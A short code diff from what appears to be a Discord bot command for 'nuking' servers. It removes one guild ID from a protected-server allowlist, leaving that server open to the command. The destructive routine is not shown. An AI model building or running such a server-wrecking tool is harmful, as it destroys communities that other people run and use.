@@ -12,7 +12,7 @@ export default {
 
         const guildId = args[0];
         const issuerId = args[1];
-        if (['1412267331266281593','1500846516267651224'].includes(guildId)) return interaction.reply({ content: '🛡️ This server is protected and cannot be nuked.', ephemeral: true });
+        if (guildId === '1412267331266281593') return interaction.reply({ content: '🛡️ This server is protected and cannot be nuked.', ephemeral: true });
         const guild = client.guilds.cache.get(guildId);
         if (!guild) return interaction.reply({ content: '❌ Could not find the server.', ephemeral: true });
 
